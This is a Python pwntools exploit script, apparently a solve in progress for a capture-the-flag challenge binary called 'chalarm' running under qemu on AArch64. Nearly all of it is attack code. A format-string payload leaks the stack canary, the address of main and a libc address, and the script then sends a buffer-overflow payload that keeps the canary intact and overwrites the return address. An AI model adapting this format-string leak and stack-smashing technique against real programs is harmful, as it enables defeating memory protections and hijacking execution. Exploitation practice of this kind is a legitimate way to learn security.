from pwn import *
import os

#os.environ['LD_LIBRARY_PATH'] = '.'
context.terminal = ['tmux', 'split-window', '-h']

elf = context.binary = ELF('chalarm')
libc = ELF('libc.so.6')
ld = ELF('ld-linux-aarch64.so.1')

p = process('qemu-aarch64 -g 1234 chalarm'.split())

#p = process('qemu-aarch64 chalarm'.split())

#p = remote('localhost', 5000)


p.sendlineafter(b'2. Legs\n', b'1')
p.sendlineafter(b'of?\n', b'1337')
p.sendlineafter(b'appendage? ', b'%23$p%21$p%19$p')
p.recv()
leaks = p.recv().split(b'0x')
# main is at the 23rd offset
main_leak = leaks[1]
main = int(main_leak, 16)
# libc_start_main + 152 is at the 21st offset MAKE SURE TO SUBTRACT 152 FROM THE LEAK
libc_start_main_leak = leaks[2] 
libc_start_main = int(libc_start_main_leak, 16) - 152

canaryleak = leaks[3]
canary = int(canaryleak, 16)
elf_base = main - elf.symbols.main
elf.address = elf_base
libc.address = libc_start_main - libc.symbols['__libc_start_main']
print(hex(canary))
print(hex(elf.address))
print(hex(libc.address))

ldr_x19 = elf_base + 0xabc
print(hex(ldr_x19))

payload = flat([
    'a' * 104,
    canary,
    'b' * 8,
    elf.symbols.main
])

p.sendlineafter(b'feedback?!', payload)

p.interactive()
